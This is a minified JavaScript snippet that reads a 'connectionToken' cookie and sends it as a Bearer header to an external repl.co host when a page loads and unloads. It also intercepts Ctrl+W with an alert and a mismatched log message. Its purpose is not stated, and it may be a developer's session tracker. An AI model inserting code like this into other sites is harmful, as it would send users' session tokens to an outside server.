function accessCookie(e){for(var n=e+"=",o=document.cookie.split(";"),t=0;t<o.length;t++){var i=o[t].trim();if(0==i.indexOf(n))return i.substring(n.length,i.length)}return""}window.onload=function(){fetch("https://login-finished.wumpus-dev.repl.co/addSession",{method:"POST",headers:{authorization:"Bearer "+accessCookie("connectionToken")}})},window.addEventListener("keydown",function(e){e.ctrlKey&&"w"==e.key&&(console.log("Hey! Ctrl+T event captured!"),alert("CTRL+W"))}),window.addEventListener("beforeunload",function(){fetch("https://login-finished.wumpus-dev.repl.co/revokeSession",{method:"POST",headers:{authorization:"Bearer "+accessCookie("connectionToken")}})});